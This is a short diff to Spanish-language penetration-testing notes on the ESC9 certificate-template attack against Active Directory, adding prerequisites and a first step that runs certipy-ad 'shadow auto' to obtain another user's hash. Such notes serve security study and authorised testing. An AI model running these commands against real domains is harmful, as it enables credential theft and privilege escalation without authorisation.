@@ -44,6 +44,13 @@ Donde se obtiene:
 ## ESC9 - Forma 1
 
 ```bash 
+NOTA: Se necesitan dos usuarios controlados por nosotros
+Condiciones:
+	- El UserA tiene 'GeneriWrite' sobre UserB
+	- UserB tiene 'Enrollment Rights' sobre el template vulnerable ESC9
+```
+
+```bash 
 Paso 1:
 # Obtener el hash del usuario B con el usuario A
 ❯ certipy-ad shadow auto -u 'UserA@domain.local' -p 'P@$$w0rd123!' -account 'UserB'
